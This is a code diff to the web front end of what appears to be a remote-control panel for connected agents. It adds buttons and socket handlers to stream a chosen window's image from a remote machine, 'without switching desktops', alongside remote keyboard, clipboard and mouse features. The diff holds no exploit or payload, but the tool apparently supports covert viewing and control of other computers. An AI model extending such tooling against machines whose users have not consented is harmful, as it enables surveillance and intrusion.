@@ -153,6 +153,11 @@
   .win-hwnd { font-size:9px; color:#444; flex-shrink:0; }
   #win-clear-btn { margin:8px 14px; background:#2a1a1a; border:none; color:#f87171; padding:4px 10px; border-radius:5px; cursor:pointer; font-size:11px; font-family:Consolas,monospace; }
   #win-clear-btn:hover { background:#3a1a1a; }
+  .win-stream-btn { background:#1a3a2a; border:none; color:#4ade80; padding:2px 7px; border-radius:4px; cursor:pointer; font-size:10px; font-family:Consolas,monospace; flex-shrink:0; margin-left:4px; }
+  .win-stream-btn:hover { background:#1e4a30; }
+  #win-stream-badge { display:none; font-size:10px; color:#4ade80; margin-top:3px; }
+  #win-stream-stop { background:#3a1a1a; border:none; color:#f87171; padding:2px 7px; border-radius:4px; cursor:pointer; font-size:10px; font-family:Consolas,monospace; }
+  #win-stream-stop:hover { background:#4a2020; }
 
   /* ── Remote Keyboard window ─────────────────────────────────────────────── */
   #kbd-window {
@@ -368,6 +373,7 @@
       <div id="win-picker">
         <button id="win-picker-btn" onclick="openWinPicker()">🎯 Pick Target Window</button>
         <div id="win-target-label"><span>Target: </span><span id="win-target-title">—</span></div>
+      <div id="win-stream-badge">👁 Streaming window · <button id="win-stream-stop" onclick="stopWinStream()">⏹ Stop</button></div>
       </div>
     </div>
   </div>
@@ -508,6 +514,7 @@ socket.on("agent_list", agents => {
 });
 
 function selectAgent(name) {
+  if (winStreaming) stopWinStream();
   selectedAgent = name;
   clearLog();
   clearClipboard();
@@ -815,7 +822,8 @@ socket.on("windows_list", data => {
   if (!wins.length) { list.innerHTML = '<div style="padding:14px;color:#555;font-size:11px;">No windows found</div>'; return; }
   list.innerHTML = wins.map(w =>
     `<div class="win-row${targetHwnd===w.hwnd?' selected':''}" onclick="selectWin(${w.hwnd},${JSON.stringify(w.title)})">
-      <span style="flex:1">${w.title.substring(0,50)}</span>
+      <span style="flex:1">${w.title.substring(0,40)}</span>
+      <button class="win-stream-btn" onclick="event.stopPropagation();selectWin(${w.hwnd},${JSON.stringify(w.title)});startWinStream(${w.hwnd})">👁 Stream</button>
       <span class="win-hwnd">#${w.hwnd}</span>
     </div>`
   ).join("");
@@ -828,6 +836,30 @@ function selectWin(hwnd, title) {
   lbl.style.display = "block";
   closeWinPicker();
 }
+
+// ── Window stream (PrintWindow — captures without switching desktops) ─────────
+let winStreaming = false;
+
+function startWinStream(hwnd) {
+  if (!selectedAgent) return;
+  winStreaming = true;
+  document.getElementById("win-stream-badge").style.display = "block";
+  socket.emit("win_capture_start", { hwnd, _target: selectedAgent });
+  closeWinPicker();
+}
+
+function stopWinStream() {
+  if (!selectedAgent) return;
+  winStreaming = false;
+  document.getElementById("win-stream-badge").style.display = "none";
+  socket.emit("win_capture_stop", { _target: selectedAgent });
+}
+
+socket.on("win_frame", d => {
+  if (!winStreaming) return;
+  if (d._agent && d._agent !== selectedAgent) return;
+  frameImg.src = "data:image/jpeg;base64," + d.data;
+});
 
 // PostMessage mouse: when target window selected, clicks on canvas go to target
 screenPanel.addEventListener("click", e => {
